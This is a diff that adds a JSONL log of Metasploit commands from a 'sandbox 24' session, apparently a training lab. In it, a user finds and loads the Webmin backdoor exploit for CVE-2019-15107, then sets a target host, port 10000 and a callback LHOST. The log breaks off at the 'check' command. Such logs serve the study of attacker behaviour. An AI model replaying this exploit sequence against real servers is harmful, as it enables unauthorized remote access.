@@ -1,0 +1,15 @@
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:45:18.162Z", "cmd_type": "msf-command", "cmd": "search exploit/unix Webmin"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:45:22.424Z", "cmd_type": "msf-command", "cmd": "search exploit/unix/Webmin"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:45:26.316Z", "cmd_type": "msf-command", "cmd": "search exploit/unix Webmin"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:45:31.503Z", "cmd_type": "msf-command", "cmd": "search exploit/unix | grep s"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:45:35.131Z", "cmd_type": "msf-command", "cmd": "search exploit/unix | grep Webmin"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:45:44.093Z", "cmd_type": "msf-command", "cmd": "search -h"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:46:03.406Z", "cmd_type": "msf-command", "cmd": "search CVE-2019-15107"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:46:51.056Z", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_backdoor"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:47:03.434Z", "cmd_type": "msf-command", "cmd": "show"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:47:30.712Z", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:47:42.835Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:48:13.240Z", "cmd_type": "msf-command", "cmd": "set RHOST 172.18.1.5"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:48:13.240Z", "cmd_type": "msf-command", "cmd": "set RPORT 10000"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:48:17.095Z", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:48:22.435Z", "cmd_type": "msf-command", "cmd": "check"}
